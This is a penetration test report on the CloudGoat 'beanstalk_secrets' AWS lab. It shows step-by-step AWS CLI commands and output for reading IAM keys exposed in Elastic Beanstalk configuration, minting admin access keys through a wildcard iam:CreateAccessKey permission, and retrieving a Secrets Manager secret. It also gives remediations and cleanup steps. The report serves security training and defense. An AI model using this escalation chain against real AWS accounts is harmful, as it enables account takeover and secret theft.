# AWS Elastic Beanstalk Secrets Exposure & IAM Privilege Escalation — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of a CloudGoat (`beanstalk_secrets`) AWS environment, simulating a realistic Elastic Beanstalk attack chain. Starting from a low-privilege IAM user with access scoped to Elastic Beanstalk, the goal was to identify and abuse misconfigurations in Beanstalk environment configuration, IAM credential issuance permissions, and IAM policy design to escalate to full administrative access and retrieve a sensitive value from AWS Secrets Manager.

## Scope of Work

**In-Scope Assets:**
- **AWS Account:** 390346502168
- **Initial Access:** IAM user `cgid40f7j9opmj_low_priv_user` (provided as starting credentials)
- **Services:** AWS Elastic Beanstalk, AWS IAM, AWS STS, AWS Secrets Manager
- **Testing Perspective:** Low-privilege IAM user with no prior knowledge of the environment

---

## Enumeration

### Initial Identity Verification

```bash
aws sts get-caller-identity --profile cloudgoat_beanstalk
```
```json
{
    "UserId": "AIDAVVYTW6AMEB4MKMQBX",
    "Account": "390346502168",
    "Arn": "arn:aws:...."
}
```

The `cgid40f7j9opmj_low_priv_user` was confirmed as the starting point. Since the user was described as having Elastic Beanstalk access, enumeration began there.

### Elastic Beanstalk Enumeration

A single application and environment were discovered:

```bash
aws elasticbeanstalk describe-applications --profile cloudgoat_beanstalk --region us-east-1
aws elasticbeanstalk describe-environments --profile cloudgoat_beanstalk --region us-east-1
```

This identified application `cgid40f7j9opmj-app` and environment `cgid40f7j9opmj-env`, running Python 3.11 on Amazon Linux 2023, fronted by a classic load balancer.

### Configuration Settings Disclosure

The environment's full configuration was retrieved:

```bash
aws elasticbeanstalk describe-configuration-settings \
  --application-name cgid40f7j9opmj-app \
  --environment-name cgid40f7j9opmj-env \
  --profile cloudgoat_beanstalk --region us-east-1
```

Within the `OptionSettings` array, the `aws:elasticbeanstalk:application:environment` namespace returned the application's environment variables in plaintext, including a second set of IAM credentials:

```json
{
    "Namespace": "aws:elasticbeanstalk:application:environment",
    "OptionName": "SECONDARY_ACCESS_KEY",
    "Value": "AKIAVVY.....XS"
},
{
    "Namespace": "aws:elasticbeanstalk:application:environment",
    "OptionName": "SECONDARY_SECRET_KEY",
    "Value": "qAGdSrws7s...Ld"
}
```

### Tools Used
- AWS CLI
- `aws sts`, `aws elasticbeanstalk`, `aws iam`, `aws secretsmanager`

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| IAM Credentials Exposed in Elastic Beanstalk Environment Configuration | Critical | Lateral movement to a second IAM user with credential-issuance permissions |
| Unrestricted `iam:CreateAccessKey` Permission (Wildcard Resource) | Critical | Privilege escalation to any IAM user in the account, including admin |
| Sensitive Value Stored in AWS Secrets Manager Reachable via Escalated Admin Access | High | Full disclosure of the target secret following privilege escalation |

---

### IAM Credentials Exposed in Elastic Beanstalk Environment Configuration

#### Severity
Critical

#### CWE
CWE-798: Use of Hard-coded Credentials

#### OWASP Category
OWASP Top 10 2021 – A07: Identification and Authentication Failures

#### Description
The `cgid40f7j9opmj_low_priv_user` had sufficient Elastic Beanstalk read permissions to call `elasticbeanstalk:DescribeConfigurationSettings`. The returned configuration included the application's environment variables in plaintext, fully visible via the API to any principal with describe access on the environment. These variables contained a complete, active IAM access key and secret key pair (`SECONDARY_ACCESS_KEY` / `SECONDARY_SECRET_KEY`) belonging to a second IAM user.

#### Affected Functionality
- Elastic Beanstalk application: `cgid40f7j9opmj-app`
- Elastic Beanstalk environment: `cgid40f7j9opmj-env`
- Environment variables: `SECONDARY_ACCESS_KEY`, `SECONDARY_SECRET_KEY`

#### Steps to Reproduce
1. Enumerate Beanstalk applications and environments using the initial low-privilege credentials:
   ```bash
   aws elasticbeanstalk describe-applications --profile cloudgoat_beanstalk --region us-east-1
   aws elasticbeanstalk describe-environments --profile cloudgoat_beanstalk --region us-east-1
   ```
2. Retrieve the full environment configuration, including environment variables:
   ```bash
   aws elasticbeanstalk describe-configuration-settings \
     --application-name cgid40f7j9opmj-app \
     --environment-name cgid40f7j9opmj-env \
     --profile cloudgoat_beanstalk --region us-east-1
   ```
3. Extract the credential pair from the `OptionSettings` entries under the `aws:elasticbeanstalk:application:environment` namespace.

#### Proof of Concept
The configuration response disclosed a live IAM key pair in plaintext:
```
SECONDARY_ACCESS_KEY=AKIAVVYTW6AMNVEYG5XS
SECONDARY_SECRET_KEY=qAG...ZBrsTqhSqkAyu4uLd
```
These were confirmed via `aws sts get-caller-identity` to belong to IAM user `cgid40f7j9opmj_secondary_user`.

#### Impact
- Full credential disclosure for a second IAM user with broader IAM read and credential-creation permissions
- Enables direct lateral movement into that user's permission set, leading to the privilege escalation finding below

#### Root Cause
Elastic Beanstalk stores application environment variables as part of the environment's configuration, which is returned in plaintext by `DescribeConfigurationSettings` to any principal with that read permission. Storing long-lived IAM credentials as Beanstalk environment variables is equivalent to hardcoding them in source code or configuration files — they are not encrypted at rest from the perspective of API consumers and are visible to anyone who can describe the environment, not just the running application instance.

#### Recommendation
- Never store IAM access keys in Elastic Beanstalk environment variables
- Use an EC2 instance profile / IAM role attached to the Beanstalk environment to grant the application permissions — no static credentials needed
- If secrets must be injected at runtime, use AWS Secrets Manager or SSM Parameter Store (`SecureString`) and retrieve them from within the application at startup, not via Beanstalk environment configuration
- Restrict `elasticbeanstalk:DescribeConfigurationSettings` to only the principals who require full environment visibility

#### References
- OWASP Top 10 2021 – A07: Identification and Authentication Failures
- CWE-798
- [Elastic Beanstalk Environment Properties and Secrets](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/environments-cfg-softwaresettings.html)

---

### Unrestricted `iam:CreateAccessKey` Permission (Wildcard Resource)

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The `cgid40f7j9opmj_secondary_user`, whose credentials were recovered from the Beanstalk environment variables, held a policy (`cgid40f7j9opmj_secondary_policy`) granting `iam:CreateAccessKey` on `Resource: "*"`, with no condition restricting which user the key could be created for. The same policy also granted broad IAM read permissions (`iam:ListUsers`, `iam:GetUser`, `iam:ListRoles`, `iam:ListPolicies`, etc.), making it trivial to enumerate other IAM users in the account and mint a new access key for any of them — including an administrative user.

#### Affected Functionality
- IAM user: `cgid40f7j9opmj_secondary_user`
- IAM policy: `cgid40f7j9opmj_secondary_policy`
- Target user: `cgid40f7j9opmj_admin_user`

#### Steps to Reproduce
1. Confirm the secondary user's identity and attached policy:
   ```bash
   aws sts get-caller-identity --profile cloudgoat_beanstalk_secondary
   aws iam list-attached-user-policies --user-name cgid40f7j9opmj_secondary_user --profile cloudgoat_beanstalk_secondary
   aws iam get-policy-version --policy-arn arn:aws:iam::3..opmj_secondary_policy --version-id v1 --profile cloudgoat_beanstalk_secondary
   ```
2. Enumerate all IAM users in the account using the granted `iam:ListUsers` permission:
   ```bash
   aws iam list-users --profile cloudgoat_beanstalk_secondary
   ```
   This revealed `cgid40f7j9opmj_admin_user` alongside the low-privilege and secondary users.
3. Create a new access key for the admin user directly:
   ```bash
   aws iam create-access-key --user-name cgid40f7j9opmj_admin_user --profile cloudgoat_beanstalk_secondary
   ```
4. Configure a new CLI profile with the returned key pair and confirm escalated identity:
   ```bash
   aws sts get-caller-identity --profile cloudgoat_beanstalk_admin
   ```

#### Proof of Concept
```bash
$ aws iam create-access-key --user-name cgid40f7j9opmj_admin_user --profile cloudgoat_beanstalk_secondary
{
    "AccessKey": {
        "UserName": "cgid40f7j9opmj_admin_user",
        "AccessKeyId": "AKIAVVYTW6AMIX7H6NUS",
        "Status": "Active",
        "SecretAccessKey": "ix+8e4dwd....wmlLu7d8mGmsTkhNDZ",
        "CreateDate": "2026-06-07T20:52:36+00:00"
    }
}

$ aws sts get-caller-identity --profile cloudgoat_beanstalk_admin
{
    "UserId": "AIDAVVYTW6AMDZ74YNV5U",
    "Account": "390346502168",
    "Arn": "arn:aws:iam:...j_admin_user"
}
```
The secondary user's credentials were used to mint a brand-new, fully valid access key for the admin user — without ever needing to know or steal the admin's existing credentials.

#### Impact
- Allows escalation from a mid-tier IAM identity to **any** other IAM user in the account by directly minting new credentials for them
- This is a well-documented IAM privilege escalation primitive: a principal with unrestricted `iam:CreateAccessKey` and the ability to enumerate users can self-select the most privileged identity in the account and impersonate it indefinitely (until the key is detected and revoked)

#### Root Cause
The policy granted `iam:CreateAccessKey` with `Resource: "*"` instead of scoping it to the calling principal's own user ARN (e.g., via `${aws:username}` resource interpolation) or to a specific, non-privileged set of users. Pairing this with unrestricted `iam:ListUsers`/`iam:GetUser` gave the holder both the discovery and the escalation primitive in a single policy.

#### Recommendation
- Scope `iam:CreateAccessKey` to the calling user's own identity only, e.g. `"Resource": "arn:aws:iam::<account-id>:user/${aws:username}"`, so users can manage only their own keys
- Never grant `iam:CreateAccessKey` with a wildcard resource to non-administrative users
- Apply IAM permissions boundaries to prevent any user-creatable policy from exceeding a defined maximum privilege envelope
- Use AWS IAM Access Analyzer or a privilege-escalation scanner (e.g., Pacu `iam__privesc_scan`, PMapper) to detect this and related `iam:CreateAccessKey`/`iam:CreateLoginProfile`/`iam:UpdateAccessKey` escalation paths
- Enable CloudTrail alerting on `CreateAccessKey` calls targeting users other than the caller, especially against accounts tagged as privileged/admin

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-269
- [AWS IAM Privilege Escalation Methods (Rhino Security Labs)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

---

### Sensitive Value Stored in AWS Secrets Manager Reachable via Escalated Admin Access

#### Severity
High

#### CWE
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
Once administrative access was obtained via the `cgid40f7j9opmj_admin_user` credentials, AWS Secrets Manager was queried directly. A single secret, `cgid40f7j9opmj_final_flag`, was discovered and retrieved in full, demonstrating that the privilege escalation chain led to complete exposure of the account's most sensitive stored value.

#### Affected Functionality
- AWS Secrets Manager secret: `cgid40f7j9opmj_final_flag`

#### Steps to Reproduce
1. Using the escalated admin credentials, list available secrets:
   ```bash
   aws secretsmanager list-secrets --profile cloudgoat_beanstalk_admin --region us-east-1
   ```
2. Retrieve the secret value:
   ```bash
   aws secretsmanager get-secret-value \
     --secret-id cgid40f7j9opmj_final_flag \
     --profile cloudgoat_beanstalk_admin --region us-east-1
   ```

#### Proof of Concept
```json
{
    "ARN": "arn:aws:se..._final_flag-3VhmCh",
    "Name": "cgid40f7j9opmj_final_flag",
    "VersionId": "terraform-20260607161732939900000002",
    "SecretString": "FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}",
    "VersionStages": ["AWSCURRENT"]
}
```
This confirmed full read access to the account's protected secret material as the terminal step of the attack chain.

#### Impact
- Demonstrates complete compromise of the account's secrets management layer once administrative privileges are obtained
- In a real environment, this could expose database credentials, API keys, signing keys, or other material whose disclosure would enable further compromise well beyond the AWS account itself

#### Root Cause
This finding is not a misconfiguration of Secrets Manager itself, but a consequence of the upstream privilege escalation: once an attacker holds administrative IAM credentials, all resources in the account — including secrets explicitly designed to be tightly access-controlled — become reachable. The presence of a sensitive value here illustrates the blast radius of the earlier findings.

#### Recommendation
- Address the upstream credential exposure and `iam:CreateAccessKey` misconfigurations (see previous findings) to prevent the escalation path from being reachable at all
- Apply resource-based policies on individual Secrets Manager secrets to restrict which principals may read them, even from within the same account
- Enable CloudTrail logging and alerting on `GetSecretValue` calls, particularly from newly created or recently modified IAM identities
- Consider AWS Secrets Manager automatic rotation for high-value secrets so that exposure has a limited window of usefulness

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-200
- [AWS Secrets Manager Resource Policies](https://docs.aws.amazon.com/secretsmanager/latest/userguide/auth-and-access_resource-based-policies.html)

---

## Attack Chain Summary

1. Started with low-privilege IAM user `cgid40f7j9opmj_low_priv_user`, scoped to Elastic Beanstalk access (provided as initial access)
2. Enumerated Beanstalk applications and environments, then retrieved full environment configuration via `describe-configuration-settings`
3. Discovered a second IAM user's access key and secret key stored in plaintext as Beanstalk environment variables (`SECONDARY_ACCESS_KEY` / `SECONDARY_SECRET_KEY`)
4. Authenticated as the secondary user and enumerated its IAM policy, revealing unrestricted `iam:CreateAccessKey` and broad IAM read permissions
5. Used `iam:ListUsers` to enumerate all IAM users in the account and identify `cgid40f7j9opmj_admin_user`
6. Called `iam:CreateAccessKey` against the admin user to mint a brand-new, valid access key pair without needing the admin's original credentials
7. Authenticated as the admin user and queried AWS Secrets Manager, retrieving the final target secret in full

## Key Takeaways

- Elastic Beanstalk environment variables are returned in plaintext by `DescribeConfigurationSettings` to any principal with that permission — never store credentials there; use an instance profile/IAM role instead
- Unrestricted `iam:CreateAccessKey` (`Resource: "*"`) is a direct privilege escalation primitive: anyone holding it can mint credentials for any other user, including administrators, without ever touching their original keys
- Pairing broad IAM read permissions (`iam:ListUsers`, `iam:GetUser`) with credential-issuance permissions gives a principal both the discovery and the escalation primitive in one policy — these should never be granted together to non-administrative users
- As in other cloud attack chains, each individual misconfiguration (env-var credential exposure, wildcard `CreateAccessKey`) might look "Medium" in isolation, but together they form a complete, low-effort path from a Beanstalk-scoped low-privilege user to full administrative control and secret disclosure
- AWS Secrets Manager content is only as protected as the IAM boundary around it — securing the secret itself does nothing if the surrounding IAM design allows trivial escalation to an identity that can already read it

---

## Cleanup / Teardown

To avoid ongoing AWS charges and to leave the environment in a clean state after testing:

1. **Revoke the access key minted for the admin user** during exploitation, if not already deactivated by lab teardown:
   ```bash
   aws iam update-access-key \
     --user-name cgid40f7j9opmj_admin_user \
     --access-key-id AKIAVVYTW6AMIX7H6NUS \
     --status Inactive \
     --profile cloudgoat_beanstalk_secondary
   ```
   or delete it outright:
   ```bash
   aws iam delete-access-key \
     --user-name cgid40f7j9opmj_admin_user \
     --access-key-id AKIAVVYTW6AMIX7H6NUS \
     --profile cloudgoat_beanstalk_secondary
   ```
2. **Destroy the CloudGoat scenario** to tear down all provisioned infrastructure (Beanstalk application/environment, IAM users/policies, Secrets Manager secret) and avoid continued billing:
   ```bash
   cloudgoat destroy beanstalk_secrets
   ```
3. Confirm in the AWS Console (Elastic Beanstalk, IAM, Secrets Manager) that no residual applications, environments, access keys, or secrets from the scenario remain.